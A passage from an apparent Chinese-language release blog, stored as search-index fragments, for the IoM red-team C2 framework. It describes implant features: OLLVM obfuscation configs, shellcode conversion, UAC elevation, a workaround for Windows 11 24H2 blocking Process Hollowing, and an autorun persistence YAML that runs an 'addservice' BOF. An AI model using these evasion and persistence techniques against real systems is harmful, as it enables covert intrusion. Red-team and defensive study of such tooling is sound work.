\u4e2d\uff0c \u6211\u4eec\u63d0\u4f9b\u4e86\u96c6\u6210\u4e86ollvm\u7684docker\u955c\u50cf( <code>ollvm16 + rust1.74.0</code> toolchain,  \u6b64\u5916\u8fd8\u63d0\u4f9b\u4e86 <code>ollvm17 + rust1.74.0</code> \u7684 <code>Dockerfile</code>)\u4ee5\u53camalefic-mutant\u7f16\u8bd1\u5de5\u5177\u3002\u5e26\u6765\u4e86\u57fa\u7840\u7248\u672c\u7684ollvm\u3002 community\u4e2d\u7684ollvm\u4e3a\u5f00\u6e90\u7248\u672c\u7684\u5de5\u7a0b\u5316\u5b9e\u73b0, \u7279\u5f81\u4e0e\u7279\u6027\u4e0e\u5f00\u6e90\u7248\u672c\u4e00\u81f4\uff0c \u4f46\u662f\u5927\u5927\u7b80\u5316\u4e86\u73af\u5883\u914d\u7f6e\u7684\u590d\u6742\u6027\u3002  </p> <ul> <li>\u611f\u8c22@https://github.com/joaovarelas/Obfuscator-LLVM-16.0 \u63d0\u4f9b\u7684 <code>Dockerfile</code>\u53ca <code>ollvm16 patch</code></li> <li>\u611f\u8c22@https://github.com/DreamSoule/ollvm17 \u5bf9 <code>ollvm17</code> \u7684\u652f\u6301</li> <li>\u611f\u8c22@https://github.com/61bcdefg/Hikari-LLVM15-Core/ \u5bf9\u5e73\u5766\u5316\u7684\u652f\u6301</li> </ul> <pre><code>build:  \n  zigbuild: false  \n  ollvm:  \n    enable: true  \n    bcfobf: true  \n    splitobf: false  \n    subobf: false  \n    fco: false  \n    constenc: false\n</code></pre> <pre><code>malefic-mutant build malefic\n</code></pre>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#iom-for-ai-preview","title":"IoM for AI (Preview)","text":"<p>\u8fd9\u662f\u9690\u85cf\u7684\u7b2c\u4e94\u4e2a\u65b0\u7ec4\u4ef6\uff0c\u4f46\u662f\u529f\u80fd\u6682\u65f6\u8fd8\u6ca1\u6709\u7a33\u5b9a\uff0c\u6240\u4ee5\u4e0d\u7b97\u662f\u6b63\u5f0f\u53d1\u5e03\u3002 </p> <p>AI\u7ed9IoM\u7684\u5f00\u53d1\u63d0\u4f9b\u4e86\u975e\u5e38\u5de8\u5927\u7684\u5e2e\u52a9\uff0c \u6709\u4e0d\u5c11\u6a21\u5757\u7684\u539f\u578b\u90fd\u662fAI\u5b9e\u73b0\u7684\u3002</p> <p>\u5e76\u4e14\u5728\u8bbe\u8ba1\u65e9\u671f\uff0c \u6211\u4eec\u5c31\u5e7b\u60f3\u8fc7\u5982\u4f55\u5c06AI\u5e94\u7528\u5230C2\u4e2d\uff0c \u4e4b\u524d\u4e00\u76f4\u6ca1\u6709\u7279\u522b\u597d\u7684\u65b9\u6848\uff0c \u800c\u73b0\u5728\u6211\u4eec\u6709\u4e86\u5168\u65b0\u7684\u5de5\u5177\u548c\u601d\u8def\u3002</p> <p>\u521a\u624d\u63d0\u5230\u8fc7\u6211\u4eec\u7684GUI\u57fa\u4e8evscode\u63d2\u4ef6\u5b9e\u73b0\uff0c\u800cAI\u7f16\u7a0b\u4e5f\u5f88\u96be\u79bb\u5f97\u5f00vscode\uff0c \u5982cursor\u3001cline\uff0ctrae\uff0cwindsurf \u7b49\u5de5\u5177\u90fd\u79bb\u4e0d\u5f00vscode\u3002\u53ef\u4ee5\u8bf4vscode \u5927\u6982\u7387\u662f\u672a\u6765AI\u7f16\u7a0b\u7684\u8bd5\u9a8c\u4e2d\u5fc3\u3002 IoM GUI\u5728\u8fd9\u4e2aAI \u9a71\u52a8\u7684\u81ea\u52a8\u5316\u6e17\u900f\u9886\u57df\u4e2d\u6709\u5148\u5929\u7684\u4f18\u52bf\u3002</p> <p>\u800c\u8fd9\u6bb5\u65f6\u95f4\u5185\uff0c\u51fa\u73b0\u4e86MCP\u534f\u8bae\uff0c \u4f5c\u4e3aAI\u4e0e\u4f20\u7edf\u5de5\u5177\u7684\u6865\u6881\uff0c \u8ba9\u6211\u4eec\u53ef\u4ee5\u66f4\u5feb\u7684\u6253\u901a\u5176\u95f4\u7684\u58c1\u5792\uff0c \u8ba9\u6211\u4eec\u4e0d\u518d\u9700\u8981\u81ea\u884c\u5b9e\u73b0\u4e00\u4e2aagent\u6846\u67b6\uff0c\u76f4\u63a5\u5c06\u77e5\u8bc6\u548c\u80fd\u529b\u90fd\u66b4\u9732\u7ed9AI\uff0c \u8ba9AI\u6839\u636e\u9700\u6c42\u81ea\u884c\u8c03\u7528\u3002 </p> <p>\u8be5\u529f\u80fd\u8fd8\u5904\u4e8e\u4e8e\u65e9\u671f\u6d4b\u8bd5\u9636\u6bb5\uff0c\u4f1a\u5728nightly release\u4e2d\u53d1\u5e03 </p> <p></p> <p></p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#\u66f4\u65b0\u65e5\u5fd7","title":"\u66f4\u65b0\u65e5\u5fd7","text":""},{"location":"blog/2025/04/14/IoM_v0.1.0/#server-context-\u91cd\u6784","title":"(server) Context \u91cd\u6784","text":"<p>\u4e3a\u4e86\u7ba1\u7406\u53ef\u590d\u7528\u7684\u6570\u636e\uff0c\u63d0\u4f9b\u4e86\u4e00\u7ec4api\u4fdd\u5b58\u6e17\u900f\u8fc7\u7a0b\u4e2d\u9700\u8981\u91cd\u590d\u4f7f\u7528\u7684\u5e38\u89c1\u6570\u636e\u3002</p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#server-donut-\u91cd\u6784","title":"(server) donut \u91cd\u6784","text":"<p>\u4e4b\u524d\u6211\u4eec\u5c1d\u8bd5\u81ea\u884c\u5b9e\u73b0\u4e86 https://github.com/chainreactors/malefic-srdi \uff0c \u4f46\u662fRDI\u7684\u529f\u80fd\u5e76\u4e0d\u6b62PE to shellcode\uff0c \u8fd8\u6709\u5927\u91cf\u5404\u79cd\u5404\u6837\u7684\u529f\u80fd, \u6700\u540e\u6211\u4eec\u9009\u62e9\u4e86\u59a5\u534f\u3002 \u540e\u7eed\u5c06\u91c7\u7528\u4e8c\u5f00\u7684donut\u5b9e\u73b0\u3002  \u8fd9\u91cc - \u611f\u8c22@howmp \u7684 https://github.com/howmp/donut_ollvm  - \u611f\u8c22@howmp \u5c06malefic-srdi\u4e2dTLS\u7684\u89e3\u51b3\u65b9\u6848\u79fb\u690d\u5230\u4e86zig\u3002  - \u611f\u8c22@zema1 \u5c06TLS\u7684\u89e3\u51b3\u65b9\u6848\u4ecezig\u79fb\u690d\u5230\u4e86donut - \u611f\u8c22@wabzsy\u7684 https://github.com/wabzsy/gonut \u57fa\u4e8edonut 1.1\u5b9e\u73b0\u4e86golang\u7248\u672c\u7684donut\u524d\u7aef</p> <p>\u53c8\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u6539\u9020\uff1a</p> <ul> <li>\u81ea\u52a8\u5316 ollvm \u7f16\u8bd1</li> <li>\u4fee\u590d\u591a\u4e2agonut\u7684\u9519\u8bef</li> <li>\u5c06gonut\u5347\u7ea7\u5230\u9002\u914ddonut 1.1</li> <li>\u6ce8\u518c\u5230IoM\u7684client\u4e0eserver\u7684\u5404\u4e2a\u4f7f\u7528\u573a\u666f\u4e2d</li> <li>\u4f7f\u7528saferwall/pe\u4ee3\u66ffBinject/debug , \u66f4\u7a33\u5b9a\u7684pe\u89e3\u6790\u5e93</li> </ul> <p>\u6700\u7ec8\u6210\u529f\u5448\u73b0\u5728 https://github.com/chainreactors/malice-network/tree/dev/external/gonut \u4e2d</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#server-http-pipeline","title":"(server) http pipeline","text":"<p>\u5b9e\u73b0\u4e86http pipeline\u7684\u57fa\u7840\u529f\u80fd,  \u80fd\u81ea\u5b9a\u4e49\u57fa\u672c\u7684\u7279\u5f81\u3002 \u5e76\u4e14\u5c06\u539f\u672cpulse http\u534f\u8bae\u4e0a\u7ebf\u7684\u76f8\u5173\u529f\u80fd\u4ecewebsite\u8fc1\u79fb\u5230http pipeline\u4e2d\u3002</p> <p>\u73b0\u5728http pipeline\u8d1f\u8d23pulse\u548cmalefic beacon\u7684http\u534f\u8bae\u4ea4\u4e92\uff0cwebsite\u73b0\u5728\u53ea\u8d1f\u8d23\u6302\u8f7d\u6587\u4ef6\u3002 </p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#client-\u547d\u4ee4\u884cui\u7f8e\u5316","title":"(client) \u547d\u4ee4\u884cUI\u7f8e\u5316","text":"<p>flag\u5206\u7ec4\u5c55\u793a </p> <p>OPSEC\u6807\u8bb0\uff0c\u989c\u8272\u6807\u8bb0\uff0cATT&amp;CK\u6807\u8bb0</p> <p></p> <p>\u547d\u4ee4\u884chelp\u7ec6\u8282</p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-\u652f\u6301\u6253\u5305\u4e0e\u91ca\u653e\u6587\u4ef6","title":"(implant) \u652f\u6301\u6253\u5305\u4e0e\u91ca\u653e\u6587\u4ef6","text":"<p>implant\u6dfb\u52a0\u4e86pack\u76f8\u5173\u914d\u7f6e\uff0c \u53ef\u4ee5\u6307\u5b9a\u6253\u5305\u6587\u4ef6\u7684\u8def\u5f84\u4e0e\u91ca\u653e\u8def\u5f84\uff0c \u5e76\u5728\u91ca\u653e\u540e\u81ea\u52a8\u6253\u5f00\u6587\u4ef6\u3002 </p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-\u91cd\u6784\u8d44\u6e90\u6587\u4ef6","title":"(implant) \u91cd\u6784\u8d44\u6e90\u6587\u4ef6","text":"<p>\u901a\u8fc7 embed-resource \u5e93(\u4ec5\u7f16\u8bd1\u65f6\u5f15\u5165)\u5b9e\u73b0\u66f4\u591a\u7684\u8d44\u6e90\u6587\u4ef6\u529f\u80fd\u3002 \u5e76\u652f\u6301gnu+msvc(\u539f\u5148\u53ea\u652f\u6301msvc)</p> <p>\u4f8b\u5982\u5728\u542f\u52a8\u65f6\u7533\u8bf7\u7ba1\u7406\u5458\u6743\u9650\u6216\u8005UAC\u6743\u9650</p> <p></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-\u652f\u6301win11-24h2\u53ca\u4ee5\u540e\u7684runpe","title":"(implant) \u652f\u6301win11 24H2\u53ca\u4ee5\u540e\u7684RunPE","text":"<p>\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u5fae\u8f6f\u5b89\u5168\u56e2\u961f\u53d1\u529b\uff0c \u5728 <code>win11 24H2</code> \u7248\u672c\u4e2d\uff0c \u5982\u679c\u5404\u4f4d\u4f7f\u7528 <code>Process Hollowing</code>\uff0c \u5c06\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u62a5\u9519 <code>0xc0000141</code></p> <p>\u5982\u679c\u5404\u4f4d\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u67e5\u770bhasherezade \u7684\u7cbe\u5f69\u5206\u6790</p> <p>\u6211\u5c06\u5728\u8fd9\u91cc\u7b80\u8981\u4ecb\u7ecd\u539f\u56e0\u53ca\u89e3\u51b3\u65b9\u6848</p> <p>\u4e3a\u907f\u514d\u90e8\u5206\u8bfb\u8005\u5bf9 <code>Process Hollowing</code> \u6709\u4e9b\u964c\u751f\uff0c \u56e0\u6b64\u6211\u4f1a\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u8be5\u6280\u672f</p> <p><code>Process Hollowing</code> \u987e\u540d\u601d\u4e49\u5c31\u662f\u9542\u7a7a\u4e00\u4e2a\u6b63\u5e38\u8fdb\u7a0b\uff0c \u62ab\u7740\u8be5\u8fdb\u7a0b\u7684\u5916\u76ae\u6267\u884c\u6211\u4eec\u7684\u4ee3\u7801\uff0c \u56e0\u6b64\u6211\u4eec\u9700\u8981 <code>stop</code> \u4f4f\u539f\u672c\u7684\u8fdb\u7a0b\u542f\u52a8\u903b\u8f91\uff0c \u91ca\u653e\u6389\u7cfb\u7edf\u539f\u672c\u5206\u914d\u7684\u539f\u8fdb\u7a0b\u5185\u5b58\uff0c \u5c06\u6211\u4eec\u7684\u8fdb\u7a0b\u88c5\u8f7d\u8fdb\u8be5\u8fdb\u7a0b\u4e2d\uff0c \u4fee\u6539\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4ee5\u66ff\u6362\u5165\u53e3\u70b9\u3002 \u5f53\u7136\uff0c \u4e5f\u53ef\u4ee5\u4e0d\u91ca\u653e\u5185\u5b58\uff0c \u76f4\u63a5\u5206\u914d\u4e00\u5757\u65b0\u5185\u5b58\uff0c \u518d\u4fee\u6539\u5bf9\u5e94\u4e0a\u4e0b\u6587\u4fe1\u606f</p> <p>\u4f46\u8fd9\u4e5f\u5f15\u53d1\u4e86\u53e6\u4e00\u4e2a\u95ee\u9898\uff0c \u6211\u4eec\u6240\u5206\u914d\u7684\u5185\u5b58\u7686\u662f <code>private</code> \u7684\u5185\u5b58\uff0c\u800c\u975e\u6b63\u5e38\u52a0\u8f7d\u65f6\u7684 <code>image</code> \u5185\u5b58\uff0c \u56e0\u6b64\u5fae\u8f6f\u5728\u8fd9\u6b21\u66f4\u65b0\u4e2d\u65b0\u589e\u4e86\u5bf9\u8be5\u6bb5\u5185\u5b58\u7684 <code>check</code>\uff0c \u5176\u4f7f\u7528 <code>zwqueryvirtualmemory</code> \u4ee5\u53ca\u4e00\u4e2a\u65b0\u53c2\u6570 MemoryImageExtensionInformation  \u6765\u68c0\u6d4b\u662f\u5426\u662f\u5408\u6cd5\u5185\u5b58\uff0c \u4ece\u800c\u963b\u6b62\u6211\u4eec\u539f\u672c\u7684\u653b\u51fb\u94fe\u6761</p> <p>\u56e0\u6b64\uff0c\u89e3\u51b3\u65b9\u6848\u4e5f\u547c\u4e4b\u6b32\u51fa\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u8981\u5c06\u5176\u5206\u4e3a\u4e24\u79cd * \u8ba9\u6211\u4eec\u5206\u914d\u51fa <code>MEM_IMAGE</code> \u7684\u5185\u5b58 * \u5bf9\u51fd\u6570\u8fdb\u884c <code>hook</code> \u6765\u7ed5\u8fc7</p> <p>\u9996\u5148\u662f\u7b2c\u4e00\u7c7b\u65b9\u6cd5\uff0c \u5728\u5bf9\u6297\u4e2d\uff0c \u65e9\u5df2\u51fa\u73b0\u4e86\u5927\u91cf\u7684<code>Process Hollowing</code> \u53d8\u4f53\uff0c \u6bd4\u5982</p> <ul> <li>process_doppelganging</li> <li>process_ghosting</li> <li>herpaderping</li> <li>process_overwriting</li> </ul> <p>\u5f53\u7136\uff0c \u4e5f\u6709\u66f4\u52a0\u7b80\u5355\u7c97\u66b4\u7684\u65b9\u6848\uff1a <code>hook</code>\uff0c \u7531\u4e8e\u8be5\u9632\u5fa1\u65b9\u6848\u4f4d\u4e8e <code>r3</code> \u5c42\uff0c \u56e0\u6b64\u8fdb\u653b\u548c\u9632\u5b88\u65b9\u663e\u5f97\u5341\u5206\u516c\u5e73\uff0c \u89e3\u51b3\u8d77\u6765\u4e5f\u5f02\u5e38\u7b80\u5355</p> <p>\u5f53\u7136\uff0c \u9664\u4e86\u8fd9\u91cc\u8fd8\u6709\u4e00\u5904 <code>NtManageHotPatch</code> \u51fd\u6570\u9700\u8981\u5904\u7406\uff0c \u5982\u679c\u5404\u4f4d\u611f\u5174\u8da3\u53ef\u4ee5\u53c2\u8003\u548c\u9605\u8bfb\u6211\u4e0a\u9762\u8d34\u51fa\u7684\u6587\u7ae0\u4e00\u7aa5\u7a76\u7adf :)</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-peloader-\u4fee\u590d","title":"(implant) PELoader \u4fee\u590d","text":"<p>\u5728\u4e4b\u524d\u7684\u7248\u672c\u4e2d\uff0c \u7531\u4e8e\u5bf9\u67d0\u4e9b\u7ed3\u6784\u7684\u7406\u89e3\u4e0d\u591f\u6df1\u5165\uff0c \u56e0\u6b64\u5bfc\u81f4\u4e86\u67d0\u4e9b\u533a\u6bb5\u5e76\u6ca1\u6709\u6b63\u786e\u4fee\u590d\uff0c \u73b0\u5df2\u52a0\u5165\u5957\u9910</p> <ul> <li>\u901a\u8fc7\u5b9e\u73b0\u540c\u7b49\u4e8e <code>ntdll!RtlpInsertInvertedFunctionTableEntry</code> \u7684\u65b9\u6cd5\u652f\u6301\u4e86 <code>C++ Exceptions</code></li> <li>\u4fee\u590d\u4e86 <code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code> \u8868\u6062\u590d\u9519\u8bef\u7684\u95ee\u9898</li> <li>\u4fee\u590d\u4e86\u67d0\u4e9b\u60c5\u51b5\u4e0b\u52a0\u8f7d <code>PE</code> \u65f6\u8bfb\u53d6\u975e\u5bf9\u9f50\u5185\u5b58 <code>panic</code> \u7684\u95ee\u9898</li> </ul>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-\u53bb\u9664\u5916\u90e8\u4f9d\u8d56\u5e93","title":"(implant) \u53bb\u9664\u5916\u90e8\u4f9d\u8d56\u5e93","text":"<p>\u5728\u65e9\u671f\u7248\u672c\u4e2d\uff0c \u4e3a\u4e86\u5feb\u901f\u5b9e\u73b0\u529f\u80fd\uff0c \u5f15\u5165\u4e86\u5927\u91cf\u7b2c\u4e09\u65b9\u5e93\uff0c \u8fd9\u4e9b\u5e93\u4f1a\u5f15\u5165\u66f4\u591a\u4e0d\u5fc5\u8981\u7684\u5e93\u548c\u7279\u5f81\uff0c \u5e76\u4e14\u4f1a\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u5b9a\u5236\u6bcf\u4e2a\u7ec6\u8282\u7684OPSEC\u3002 </p> <p>\u6240\u4ee5\u5728\u6b64\u6b21\u66f4\u65b0\u4e2d\uff0c \u5c3d\u53ef\u80fd\u53bb\u6389\u4e86\u6240\u6709\u4e0d\u5fc5\u8981\u7684\u5e93\u3002\u76ee\u524d\u4ec5\u5269\u4e0bwmi\u4f9d\u8d56\u4e86@lz520520 \u4fee\u6539\u540e\u7684\u5e93\u3002 \u4e0d\u8fc7\u5728\u540e\u7eed\u66f4\u65b0\u4e2d\u5e94\u8be5\u4e5f\u4f1a\u53bb\u9664\uff0c \u5b8c\u5168\u672c\u5730\u5316\u3002 \u5e76\u4e14\u5c06\u4f1a\u5b9e\u73b0\u4e00\u5957\u7c7b\u4f3cBeaconGate\u7684\u673a\u5236\u589e\u5f3a\u8fd9\u4e9b\u57fa\u672c\u529f\u80fd\u7684OPSEC</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-\u8fd0\u884c\u65f6\u89e3\u8026","title":"(implant) \u8fd0\u884c\u65f6\u89e3\u8026","text":"<p>\u5728\u65e9\u671f\u7248\u672c\u4e2d\uff0c malefic \u5f02\u6b65\u8fd0\u884c\u65f6\u57fa\u4e8etokio\u5b9e\u73b0\uff0c \u540e\u6765\u4e3a\u4e86\u5c3d\u53ef\u80fd\u7f29\u51cf\u4f9d\u8d56\u5e93\uff0c \u66ff\u6362\u4e3a\u4e86async-std\u3002 \u4f46\u56e0\u4e3aasync-std\u7684\u505c\u6b62\u66f4\u65b0\u4ee5\u53ca3rd\u63d2\u4ef6\u7684\u5f15\u5165\u3002 \u6211\u4eec\u5bf9\u5f02\u6b65\u8fd0\u884c\u65f6\u505a\u4e86\u89e3\u8026\u3002 \u73b0\u5728\u53ef\u4ee5\u5728\u4e09\u79cd\u5f02\u6b65\u8fd0\u884c\u65f6\u4e2d\u4efb\u610f\u9009\u62e9\u4e00\u4e2a\uff0c \u7528\u6765\u9002\u914d\u4e0d\u540c\u7684\u63d2\u4ef6\u573a\u666f. </p> <p>\u5f53\u524d\u652f\u6301\u7684\u5f02\u6b65\u8fd0\u884c\u65f6\uff1a</p> <ul> <li>tokio</li> <li>async-std</li> <li>smol</li> </ul> <p>\u53ef\u4ee5\u5728 implant\u7684config.yaml \u4e2d\u4fee\u6539</p> <pre><code>implants:\n  runtime: tokio\n</code></pre>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-implant-autorun","title":"(implant) implant autorun","text":"<p>\u5728v0.0.3\u4e2d\u5c31\u5f15\u5165\u4e86malefic-prelude.</p> <p>\u8fd9\u4e2a\u529f\u80fd\u662f\u57fa\u4e8e yaml 2 protobuf\u5b9e\u73b0\u7684\u81ea\u52a8\u5316\u547d\u4ee4\u9884\u7f16\u6392\u3002 \u53ef\u4ee5\u5b9e\u73b0\u5728\u542f\u52a8\u65f6\u4e0d\u8fdb\u884c\u4efb\u4f55\u4ea4\u4e92\u5c31\u5b8c\u6210\u6743\u9650\u7ef4\u6301\uff0c\u53cdHOOK\uff0c \u53cdDEBUG\uff0c\u6740\u8f6f\u68c0\u67e5\u7b49\u529f\u80fd\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u7ed9beacon\u4e5f\u52a0\u5165\u4e86\u8fd9\u4e2a\u529f\u80fd\uff0c \u4e0d\u518d\u5fc5\u987b\u5206\u9636\u6bb5\u5b9e\u73b0\u3002 </p> <p>\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u7f16\u8bd1\u5230beacon\u4e2d\uff0c \u5728beacon\u542f\u52a8\u65f6\u81ea\u52a8\u6267\u884c\u9884\u7f16\u6392\u7684\u4efb\u52a1\u3002 </p> <pre><code>implants:  \n  autorun: \"persistence.yaml\"\n</code></pre> <p>persistence.yaml: <pre><code>-\n  name: bof\n  body: !ExecuteBinary\n    name: addservice\n    bin: !File \"addservice.o\"\n</code></pre></p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#implant-\u65b0\u589e3rd-module-crate","title":"(implant) \u65b0\u589e3rd module crate","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u5185\u7f6e\u7684rem\uff0c \u6211\u4eec\u5f15\u5165\u4e863<sup>rd</sup> module\u3002 </p> <p>\u5728\u8fd9\u4e2amodule\u96c6\u5408\u4e2d\uff0c \u4e0d\u518d\u9650\u5236\u5916\u90e8\u4f9d\u8d56\u5e93\u7684\u4f7f\u7528\uff0c \u540e\u7eed\u7684rustdest, keylogger\u6216\u8005\u5404\u79cd\u9700\u8981\u4f9d\u8d56\u5916\u90e8rust\u5e93\u7684\u529f\u80fd\u90fd\u4f1a\u653e\u5230\u8fd9\u91cc\u3002 </p> <p>3<sup>rd</sup> module \u9ed8\u8ba4\u4e0d\u4f1a\u7f16\u8bd1\u5230beacon\u4e2d\uff0c \u901a\u5e38\u4f5c\u4e3ahot load module\u4f7f\u7528\u3002 \u5982\u679c\u60f3\u8981\u76f4\u63a5\u7f16\u8bd1\u65f6\u6253\u5305\u53ef\u4ee5\u4fee\u6539config.yaml</p> <pre><code>implants:  \n  modules:  \n    - \"full\"  \n  enable_3rd: false  \n  3rd_modules:  \n    - \"full\"\n</code></pre> <p>\u5f53\u7136\u6211\u4eec\u4e0d\u5efa\u8bae\u8fd9\u4e48\u505a\uff0c \u56e0\u4e3a\u5149\u5f15\u5165\u4e86\u7b80\u5355\u7684http client\u3002 \u4f53\u79ef\u5c31\u589e\u52a0\u4e86\u6570\u767eK\u3002 \u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u4fee\u6539</p>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#fixs-optimizations","title":"Fixs &amp; Optimizations","text":"<ul> <li>[ci] github action \u56e0\u4e3a\u67d0\u4e9b\u5e93\u7684\u81ea\u52a8\u4f9d\u8d56\u66f4\u65b0\u5bfc\u81f4\u4e0d\u9002\u914d1.74 \u7f16\u8bd1\u5931\u8d25</li> <li>[ci] \u6dfb\u52a0\u4e86nightly release\uff0c \u6bcf\u5929\u81ea\u52a8\u53d1\u5e03\u6700\u65b0\u7248</li> <li>[server] event\u4e71\u5e8fbug</li> <li>[server] \u6570\u636e\u5e93\u7ed3\u6784\u5927\u91cf\u6539\u52a8\uff0c\u9700\u8981\u91cd\u5efa\u6570\u636e\u5e93\uff0c \u4ece\u8fd9\u4e2a\u7248\u672c\u5f00\u59cb\uff0c\u540e\u7eed\u5c06\u4f1a\u5b9e\u73b0\u81ea\u52a8\u5316\u6570\u636e\u5e93\u8fc1\u79fb\uff0c \u5c31\u7b97\u7248\u672c\u66f4\u65b0\u4e5f\u4e0d\u7528\u62c5\u5fc3\u6570\u636e\u4e22\u5931</li> <li>[client] \u66f4\u65b0\u5e95\u5c42readline\u4e0econsole </li> <li>[client] \u6dfb\u52a0ClientGroup mals\u51fd\u6570\u7ec4, \u6dfb\u52a0\u4e86\u4e00\u7ec4\u4e0ecli\u4ea4\u4e92\u7684\u8f85\u52a9\u51fd\u6570\uff0c\u4f8b\u5982\u5404\u79cd\u547d\u4ee4\u884c\u8865\u5168</li> <li>[client] event format \u91cd\u6784\uff0c \u73b0\u5728\u5c06\u4f1a\u5728server format\u540e\u518d\u53d1\u9001\u5230\u5404\u7aef</li> <li>[implant] \u7279\u5b9a\u60c5\u51b5\u4e0bimplant \u53d1\u9001header\u4e2d\u65ad\u5bfc\u81f4\u7684\u6302\u6b7b</li> <li>[implant] \u91cd\u6784pipe</li> <li>[implant] \u53bb\u9664\u7edd\u5927\u90e8\u5206\u7684async_std \u4f9d\u8d56\uff0c \u4f7f\u7528futures\u4ee3\u66ff</li> <li>[implant] mutant log \u683c\u5f0f\u7f8e\u5316</li> <li>[implant] \u4fee\u590d\u4e86PELoader\u67d0\u4e9b\u60c5\u51b5\u4e0b\u52a0\u8f7d\u9519\u8bef\u7684\u95ee\u9898</li> <li>......</li> </ul>"},{"location":"blog/2025/04/14/IoM_v0.1.0/#end","title":"End","text":"<p>\u539f\u672c\u8ba1\u5212\u4ecev0.0.4\u76f4\u63a5\u8df3\u8dc3\u5230\u5546\u4e1a\u5316\u7248\u672c, \u4f46\u73b0\u5b9e\u9047\u5230\u7684\u56f0\u96be\u6bd4\u9884\u671f\u591a\u5f97\u591a\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u5148\u53d1\u5e03\u4e00\u4e2a\u4e2d\u95f4\u7248\u672c v0.1.0\u3002\u800c\u8fd9\u4e2a\u7248\u672c\u4e5f\u5c06\u4f5c\u4e3a\u53ef\u9884\u89c1\u672a\u6765\u5185\u7684\u6700\u540e\u4e00\u4e2a\u5927\u7248\u672c\uff0c\u540e\u7eed\u4f1a\u6709\u4e00\u4e9b\u5c0f\u7684\u6539\u52a8\u548c\u4fee\u590d\u3002 \u7b49\u5f85\u4ece\u793e\u533a\u4e2d\u83b7\u53d6\u8db3\u591f\u7684\u4f7f\u7528\u53cd\u9988\uff0c \u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b65\u7684\u5f00\u53d1\u3002 \u53ef\u4ee5\u5c1d\u8bd5\u5c06IoM v0.1.0\u4f5c\u4e3a\u4e00\u4e2a\u7a33\u5b9a\u7248\u672c\u6295\u5165\u751f\u4ea7\uff0c \u671f\u5f85\u4f60\u4eec\u7684\u53cd\u9988\uff01</p> <p>\u4e5f\u6709\u4e00\u4e2a\u76f8\u5bf9\u9057\u61be\u7684\u6d88\u606f\uff0c \u53d7\u9650\u4e8e\u8d44\u6e90\u548c\u7cbe\u529b\uff0c v0.1.0 \u53ef\u80fd\u5c06\u662f\u672a\u6765\u4e00\u6bb5\u65f6\u95f4\u5185\u7684\u7a33\u5b9a\u7248\u672c\u3002 \u56e0\u4e3a\u5b9e\u73b0roadmap\u4e2dv0.1.0\u9700\u8981\u6d88\u8017\u7684\u8d44\u6e90\u6bd4\u9884\u8ba1\u7684\u66f4\u591a\uff0c\u4e5f\u56e0\u4e3a\u5404\u79cd\u5176\u4ed6\u539f\u56e0\uff0c\u6211\u4eec\u65e0\u6cd5\u6309\u7167\u9884\u671f\u5b9e\u73b0v0.1.0\u7684\u6240\u6709\u8ba1\u5212\u5185\u7684\u529f\u80fd\u3002</p> <p>\u5982\u679c\u60a8\u8ba4\u53ef\u6211\u4eec\u7684\u4ea7\u54c1\uff0c \u6b22\u8fce\u8054\u7cfb\u6211\u4eec\u54a8\u8be2\u5173\u4e8eIoM Professional\u7684\u76f8\u5173\u4fe1\u606f\u3002 \u8054\u7cfb\u65b9\u5f0f: m09ician@gmail.com</p>"},{"location":"blog/2025/07/09/IoM_v0.1.1/","title":"IoM v0.1.1 Out of the Box \u5f00\u7bb1\u5373\u7528","text":""},{"location":"blog/2025/07/09/IoM_v0.1.1/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u8ddd\u79bb\u4e0a\u6b21\u5927\u7248\u672c\u7684\u66f4\u65b0\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e09\u4e2a\u6708\uff0c \u6211\u4eec\u5927\u6982\u6bcf\u4e2a\u6708\u4f1a\u53d1\u5e03\u4e00\u4e2apatch\uff0c \u4fee\u590d\u5df2\u77e5bug\u3001\u5bf9\u529f\u80fd\u8fdb\u884c\u5c0f\u7684\u6539\u52a8\u3002  \u79ef\u7d2f\u4e86\u8db3\u591f\u53d1\u5e03\u4e00\u4e2a\u5927\u7248\u672c\u7684\u66f4\u65b0\u5185\u5bb9\uff0c\u51b3\u5b9a\u5c06v0.1.1\u63d0\u524d\u642c\u4e0a\u6765\u3002 </p> <p>\u6211\u4eec\u5728v0.1.0 \u4e4b\u524d\u5c31\u5728implant\u4fa7\u79ef\u7d2f\u4e86\u8db3\u591f\u591a\u7684\u5e95\u5c42\u6280\u672f\uff0c 